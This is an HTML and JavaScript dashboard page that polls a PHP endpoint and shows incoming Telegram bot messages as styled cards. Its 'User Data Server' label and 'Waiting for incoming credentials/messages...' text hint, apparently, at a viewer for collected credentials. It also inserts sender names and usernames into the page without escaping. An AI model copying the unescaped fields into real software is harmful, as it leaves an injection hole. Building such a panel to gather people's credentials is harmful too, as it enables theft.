<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Live Secure Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background-color: #080a0f;
            color: #c9d1d9;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow-x: hidden;
        }

        /* --- Landing / Splash Screen Style --- */
        #landing-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(8, 10, 15, 0.95);
            backdrop-filter: blur(15px);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }
        .landing-card {
            background: rgba(22, 27, 34, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            max-width: 450px;
            width: 90%;
            position: relative;
        }
        .landing-title {
            font-size: 1.8rem;
            font-weight: bold;
            margin-bottom: 15px;
            background: linear-gradient(45deg, #00f2fe, #4facfe, #ff0844, #f79533);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-size: 300% 300%;
            animation: rgbBorder 5s ease infinite;
        }
        .landing-desc {
            color: #8b949e;
            font-size: 0.95rem;
            margin-bottom: 25px;
        }
        .start-btn {
            background: linear-gradient(135deg, #00f2fe, #4facfe);
            border: none;
            color: #0d1117;
            padding: 12px 30px;
            font-size: 1.1rem;
            font-weight: bold;
            border-radius: 30px;
            cursor: pointer;
            box-shadow: 0 0 20px rgba(0, 242, 254, 0.4);
            animation: zoomPulse 2s infinite ease-in-out;
            transition: 0.3s;
        }
        .start-btn:hover {
            transform: scale(1.08);
            box-shadow: 0 0 30px rgba(0, 242, 254, 0.8);
        }
        @keyframes zoomPulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        /* --- Main Dashboard Style --- */
        #dashboard-screen {
            width: 100%;
            max-width: 950px;
            display: none; /* Initially hidden until Start clicked */
            flex-direction: column;
            align-items: center;
            animation: fadeInDashboard 0.6s ease-out;
        }
        @keyframes fadeInDashboard {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        header {
            width: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding: 15px 25px;
            background: rgba(22, 27, 34, 0.7);
            backdrop-filter: blur(10px);
            border-radius: 14px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        h1 {
            font-size: 1.4rem;
            background: linear-gradient(45deg, #00f2fe, #4facfe, #ff0844);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .status-badge {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.85rem;
            color: #3fb950;
            margin-top: 4px;
        }
        .pulse {
            width: 8px;
            height: 8px;
            background-color: #3fb950;
            border-radius: 50%;
            box-shadow: 0 0 0 rgba(63, 185, 80, 0.4);
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(63, 185, 80, 0.7); }
            70% { box-shadow: 0 0 0 8px rgba(63, 185, 80, 0); }
            100% { box-shadow: 0 0 0 0 rgba(63, 185, 80, 0); }
        }
        .clear-btn {
            background: linear-gradient(135deg, #f857a6, #ff5858);
            border: none;
            color: white;
            padding: 8px 18px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            font-size: 0.9rem;
            transition: 0.3s;
            box-shadow: 0 4px 15px rgba(248, 87, 166, 0.3);
        }
        .clear-btn:hover {
            opacity: 0.9;
            transform: scale(1.05);
        }
        
        /* RGB Animated Border Container */
        .dashboard-container {
            width: 100%;
            position: relative;
            border-radius: 18px;
            padding: 3px;
            background: linear-gradient(60deg, #f79533, #f37055, #ef4e7b, #a166ab, #5073b6, #1098ad, #07b39b, #6fba82);
            background-size: 300% 300%;
            animation: rgbBorder 6s ease infinite;
            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
        }
        @keyframes rgbBorder {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .inner-content {
            background: rgba(22, 27, 34, 0.85);
            backdrop-filter: blur(12px);
            border-radius: 15px;
            padding: 20px;
            min-height: 450px;
            max-height: 68vh;
            overflow-y: auto;
        }
        
        /* Liquid Glass Message Card Style */
        .msg-card {
            background: rgba(33, 38, 45, 0.65);
            backdrop-filter: blur(8px);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-left: 4px solid #00f2fe;
            padding: 16px;
            margin-bottom: 15px;
            border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
            animation: fadeInCard 0.4s ease-out;
            transition: transform 0.2s, border-color 0.2s;
        }
        .msg-card:hover {
            transform: translateY(-2px);
            border-color: rgba(0, 242, 254, 0.3);
        }
        @keyframes fadeInCard {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .msg-header {
            display: flex;
            justify-content: space-between;
            font-size: 0.85rem;
            color: #8b949e;
            margin-bottom: 10px;
            border-bottom: 1px solid rgba(48, 54, 61, 0.6);
            padding-bottom: 6px;
        }
        .msg-user {
            color: #58a6ff;
            font-weight: bold;
        }
        .msg-body {
            font-size: 1.1rem;
            font-style: italic;
            color: #f0f6fc;
            background: linear-gradient(135deg, #ffffff, #c9d1d9);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            word-break: break-word;
            white-space: pre-wrap;
            line-height: 1.5;
        }
        .no-msg {
            text-align: center;
            color: #8b949e;
            margin-top: 120px;
            font-size: 1.1rem;
            font-style: italic;
        }

        /* Custom Scrollbar */
        ::-webkit-scrollbar {
            width: 6px;
        }
        ::-webkit-scrollbar-track {
            background: rgba(13, 17, 23, 0.5);
        }
        ::-webkit-scrollbar-thumb {
            background: #30363d;
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #58a6ff;
        }
    </style>
</head>
<body>

    <!-- Landing / Splash Screen -->
    <div id="landing-screen">
        <div class="landing-card">
            <div class="landing-title">User Data Server</div>
            <div class="landing-desc">Welcome to Telegram Real-Time Secure Live Dashboard. Click below to enter the live feed panel.</div>
            <button class="start-btn" onclick="startDashboard()">Start Now</button>
        </div>
    </div>

    <!-- Main Dashboard Screen -->
    <div id="dashboard-screen">
        <header>
            <div>
                <h1>Telegram Live Feed</h1>
                <div class="status-badge">
                    <div class="pulse"></div> Live Connected
                </div>
            </div>
            <button class="clear-btn" onclick="clearMessages()">Clear All</button>
        </header>

        <div class="dashboard-container">
            <div class="inner-content" id="message-box">
                <div class="no-msg">Waiting for incoming credentials/messages...</div>
            </div>
        </div>
    </div>

    <script>
        // Optional Click / Action Sound (You can put your audio link here)
        const clickSound = new Audio(''); 

        function playSound() {
            try {
                clickSound.play().catch(e => {});
            } catch(err) {}
        }

        function startDashboard() {
            playSound();
            const landing = document.getElementById('landing-screen');
            const dashboard = document.getElementById('dashboard-screen');
            
            landing.style.opacity = '0';
            setTimeout(() => {
                landing.style.display = 'none';
                dashboard.style.display = 'flex';
            }, 500);
        }

        function fetchMessages() {
            fetch('get_messages.php')
                .then(response => response.json())
                .then(data => {
                    const box = document.getElementById('message-box');
                    if (!data || data.length === 0) {
                        box.innerHTML = '<div class="no-msg">No messages received yet. Send a message to your bot!</div>';
                        return;
                    }
                    let html = '';
                    data.forEach(msg => {
                        html += `
                            <div class="msg-card">
                                <div class="msg-header">
                                    <span class="msg-user">👤 ${msg.from} (@${msg.username})</span>
                                    <span>⏱️ ${msg.time}</span>
                                </div>
                                <div class="msg-body">${escapeHtml(msg.text)}</div>
                            </div>
                        `;
                    });
                    box.innerHTML = html;
                })
                .catch(err => console.error('Error:', err));
        }

        function clearMessages() {
            playSound();
            if(confirm('Are you sure you want to clear all messages?')) {
                fetch('clear.php?action=clear')
                    .then(res => res.json())
                    .then(data => {
                        if(data.status === 'success') { 
                            fetchMessages(); 
                        }
                    });
            }
        }

        function escapeHtml(text) {
            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        }

        // Auto fetch every 2 seconds for real-time updates
        setInterval(fetchMessages, 2000);
    </script>
</body>
</html>
